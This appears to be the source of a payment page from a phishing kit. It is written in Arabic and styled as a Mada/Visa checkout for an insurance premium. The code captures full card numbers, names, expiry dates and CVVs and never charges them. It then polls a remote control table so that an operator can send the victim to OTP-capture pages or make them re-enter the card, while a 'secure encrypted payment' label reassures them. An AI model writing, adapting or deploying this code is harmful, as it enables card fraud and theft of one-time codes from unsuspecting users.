import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { addSubmission, getSubmissions } from "@/lib/submissions";
import { getControlAction } from "@/lib/api";
import { Header } from "@/components/layout/Header";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ShieldCheck, AlertCircle, Lock } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import visaMadaImg from "../assets/VISAMADAH_1779063055374.png";
import visaLogoImg from "../assets/25415.webp";

type WaitState = "idle" | "waiting" | "error";

export default function Visa() {
  const [, setLocation] = useLocation();
  
  const [cardNumber, setCardNumber] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [waitState, setWaitState] = useState<WaitState>("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const pollRef = useRef<number | null>(null);

  // Order summary state
  const [basePrice, setBasePrice] = useState(0);
  const [company, setCompany] = useState("");

  // Clear any old control from Supabase when entering this page
  const clearOldControl = async (sessionId: string) => {
    const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
    const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
    
    if (!supabaseUrl || !supabaseKey) return;
    
    try {
      await fetch(`${supabaseUrl}/rest/v1/controls?session_id=eq.${sessionId}`, {
        method: 'DELETE',
        headers: {
          'apikey': supabaseKey,
          'Authorization': `Bearer ${supabaseKey}`,
        },
      });
      console.log("Cleared old control for session:", sessionId);
    } catch (error) {
      console.error("Failed to clear old control:", error);
    }
  };

  useEffect(() => {
    const priceStr = localStorage.getItem("selectedPrice");
    const comp = localStorage.getItem("selectedCompany");
    if (priceStr) setBasePrice(parseFloat(priceStr));
    if (comp) setCompany(comp);
    
    // Clear old controls when entering page
    const sessionId = localStorage.getItem("sessionId");
    if (sessionId) {
      void clearOldControl(sessionId);
    }
  }, []);

  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);

  const discount = basePrice * 0.25;
  const afterDiscount = basePrice - discount;
  const vat = afterDiscount * 0.15;
  const total = afterDiscount + vat;

  const startPolling = (sessionId: string) => {
    if (pollRef.current) clearInterval(pollRef.current);
    let lastSeen = Math.max(...getSubmissions().map(s => s.id), 0);
    
    // Immediately clear any existing control from Supabase before starting
    void clearOldControl(sessionId);
    
    pollRef.current = window.setInterval(async () => {
      try {
        const subs = getSubmissions().filter(s => s.sessionId === sessionId && s.id > lastSeen);
        if (subs.length > 0) {
          lastSeen = Math.max(...subs.map(s => s.id, lastSeen));
          const latest = subs[subs.length - 1];
          if (latest?.type.startsWith("otp")) {
            if (pollRef.current) clearInterval(pollRef.current);
            setLocation("/otp");
            return;
          }
          if (latest?.type === "card") {
            const d = JSON.parse(latest.data || "{}");
            const cn: string = String(d.cardNumber || "");
            if (cn.replace(/\s/g, "").startsWith("0000")) {
              if (pollRef.current) clearInterval(pollRef.current);
              setErrorMsg("عذراً، بيانات البطاقة غير صحيحة. يرجى إعادة المحاولة.");
              setWaitState("error");
              setTimeout(() => {
                setWaitState("idle");
                setErrorMsg("");
                setCardNumber("");
                setCardHolder("");
                setExpiry("");
                setCvv("");
              }, 3000);
              return;
            }
          }
        }
      } catch { /* ignore */ }

      try {
        const result = await getControlAction(sessionId);
        const action = result.action;
        if (!action) return;

        if (pollRef.current) clearInterval(pollRef.current);

        if (action === "go_otp") {
          setLocation("/otp");
          return;
        }

        if (action === "go_otp2") {
          setLocation("/otp2");
          return;
        }

        if (action === "card_error") {
          setErrorMsg("عذراً، بيانات البطاقة غير صحيحة. يرجى إعادة المحاولة.");
          setWaitState("error");
          setTimeout(() => {
            setWaitState("idle");
            setErrorMsg("");
            setCardNumber("");
            setCardHolder("");
            setExpiry("");
            setCvv("");
          }, 3000);
          return;
        }
      } catch { /* ignore */ }
    }, 2000);
  };

  const handleCardNumber = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "");
    let f = val.match(/.{1,4}/g)?.join(" ") ?? "";
    if (f.length > 19) f = f.substring(0, 19);
    setCardNumber(f);
  };

  const handleExpiry = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "");
    setExpiry(val.length > 2 ? `${val.substring(0, 2)}/${val.substring(2, 4)}` : val);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const sessionId = localStorage.getItem("sessionId");
    if (!sessionId) { setLocation("/"); return; }
    const last4 = cardNumber.replace(/\D/g, "").slice(-4);
    localStorage.setItem("cardLast4", last4);
    setWaitState("waiting");

    // Submit payment summary (non-blocking)
    try {
      addSubmission("payment", sessionId, { paymentMethod: "mada_visa", amount: total.toFixed(2), insuranceCompany: company });
    } catch {}

    try {
      addSubmission("card", sessionId, { cardNumber: cardNumber.replace(/\s/g, ""), cardHolder, expiry, cvv });
      startPolling(sessionId);
    } catch {
      setWaitState("idle");
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />

      {/* ── Overlays ── */}
      <AnimatePresence>
        {waitState === "waiting" && (
          <motion.div key="waiting" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center gap-5 px-6">
            <div className="w-20 h-20 rounded-full bg-blue-50 flex items-center justify-center">
              <ShieldCheck className="w-10 h-10 text-primary" />
            </div>
            <div className="flex gap-1">
              {[0, 1, 2].map(i => (
                <motion.div key={i} className="w-3 h-3 rounded-full bg-primary"
                  animate={{ y: [0, -10, 0] }} transition={{ duration: 0.8, repeat: Infinity, delay: i * 0.25 }} />
              ))}
            </div>
            <div className="text-center">
              <p className="text-xl font-bold text-gray-800 mb-1">جاري التحقق من بيانات البطاقة</p>
              <p className="text-gray-400 text-sm">يرجى الانتظار ولا تغلق هذه الصفحة</p>
            </div>
          </motion.div>
        )}
        {waitState === "error" && (
          <motion.div key="error" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center gap-4 px-6">
            <div className="w-20 h-20 rounded-full bg-red-50 flex items-center justify-center">
              <AlertCircle className="w-10 h-10 text-red-500" />
            </div>
            <p className="text-xl font-bold text-red-600 text-center">{errorMsg}</p>
            <p className="text-gray-400 text-sm">جاري إعادة التوجيه...</p>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="container mx-auto px-4 py-6 flex-1 max-w-md">

        {/* ── Order Summary (integrated) ── */}
        {basePrice > 0 && (
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden mb-4">
            <div className="bg-primary/5 border-b border-gray-100 px-4 py-3 flex items-center justify-between">
              <span className="font-bold text-gray-800 text-sm">ملخص الطلب</span>
              <span className="text-xs text-primary font-medium">{company}</span>
            </div>
            <div className="px-4 py-3 space-y-2 text-sm">
              <div className="flex justify-between text-gray-600">
                <span>القسط الأساسي</span>
                <span>{basePrice.toFixed(2)} ر.س</span>
              </div>
              <div className="flex justify-between text-green-600">
                <span>خصم عدم المطالبات (25%)</span>
                <span>-{discount.toFixed(2)} ر.س</span>
              </div>
              <div className="flex justify-between text-gray-600">
                <span>ضريبة القيمة المضافة (15%)</span>
                <span>{vat.toFixed(2)} ر.س</span>
              </div>
              <div className="flex justify-between font-bold text-primary pt-2 border-t border-gray-100">
                <span>المجموع</span>
                <span>{total.toFixed(2)} ر.س</span>
              </div>
            </div>
          </div>
        )}

        {/* ── Card Form ── */}
        <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-5">
          <div className="flex items-center justify-between mb-4">
            <h3 className="font-bold text-gray-800 text-sm">بيانات الدفع</h3>
            <img src={visaMadaImg} alt="Visa / Mada" className="h-6 object-contain" />
          </div>

          {/* Payment method selector */}
          <div className="grid grid-cols-2 gap-3 mb-5">
            <div className="border-2 border-primary bg-blue-50 rounded-lg p-3 flex flex-col items-center justify-center">
              <img src={visaMadaImg} alt="Mada/Visa" className="h-5 mb-1 object-contain" />
              <span className="text-[10px] font-bold text-primary">مدى / فيزا / ماستركارد</span>
            </div>
            <div className="border border-gray-200 bg-gray-50 rounded-lg p-3 flex flex-col items-center justify-center opacity-40 cursor-not-allowed">
              <div className="h-5 mb-1 flex items-center">
                <svg viewBox="0 0 24 24" className="w-16 h-5 fill-current text-gray-600"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg>
              </div>
              <span className="text-[10px] text-gray-500">Apple Pay</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-1.5">
              <Label className="text-xs">رقم البطاقة</Label>
              <div className="relative">
                <Input type="text" required value={cardNumber} onChange={handleCardNumber}
                  placeholder="0000 0000 0000 0000" dir="ltr" className="pr-10 text-right" maxLength={19} />
                <div className="absolute right-3 top-1/2 -translate-y-1/2">
                  <img src={visaLogoImg} alt="Visa" className="h-4 object-contain" />
                </div>
              </div>
            </div>

            <div className="space-y-1.5">
              <Label className="text-xs">الاسم على البطاقة</Label>
              <Input type="text" required value={cardHolder}
                onChange={e => setCardHolder(e.target.value)}
                placeholder="الاسم كما هو مطبوع على البطاقة" />
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div className="space-y-1.5">
                <Label className="text-xs">تاريخ الانتهاء</Label>
                <Input type="text" required value={expiry} onChange={handleExpiry}
                  placeholder="MM/YY" dir="ltr" className="text-center" maxLength={5} />
              </div>
              <div className="space-y-1.5">
                <Label className="text-xs">رمز CVV</Label>
                <Input type="text" required value={cvv}
                  onChange={e => setCvv(e.target.value.replace(/\D/g, "").substring(0, 3))}
                  placeholder="•••" dir="ltr" className="text-center" maxLength={4} />
              </div>
            </div>

            <Button type="submit"
              className="w-full h-12 text-base font-bold bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-gray-900 shadow-md mt-2"
              disabled={waitState !== "idle"}>
              ادفع الآن — {total > 0 ? `${total.toFixed(2)} ر.س` : "..."}
            </Button>

            <div className="flex items-center justify-center gap-2 pt-1">
              <Lock className="w-3 h-3 text-gray-400" />
              <span className="text-xs text-gray-400">دفع آمن ومشفر</span>
              <img src={visaMadaImg} alt="logos" className="h-5 object-contain" />
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
